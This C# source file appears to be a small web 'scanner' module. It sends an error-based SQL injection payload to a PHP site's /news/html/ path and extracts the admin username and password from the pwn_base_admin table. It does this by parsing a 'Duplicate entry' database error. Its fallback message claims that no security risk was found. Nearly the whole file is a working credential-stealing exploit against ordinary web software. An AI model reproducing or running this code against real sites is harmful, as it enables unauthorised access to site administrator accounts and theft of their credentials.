using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class phpweb
	{
		public string exp(string url)
		{
			string urls = url;
			if (!urls.Contains("http://"))
			{
				urls = "http://" + url;
			}
			return this.zhuru(urls);
		}
		public string zhuru(string url)
		{
			string result;
			try
			{
				string exp = "/news/html/?410'union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where'1'='1.html";
				string shuju = new WebClient
				{
					Encoding = Encoding.Default
				}.DownloadString(url + exp);
				string shujus = shuju.Substring(shuju.IndexOf("Duplicate entry '") + 18, 100);
				string jieguo = shujus.Substring(0, shujus.IndexOf("'"));
				result = jieguo;
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
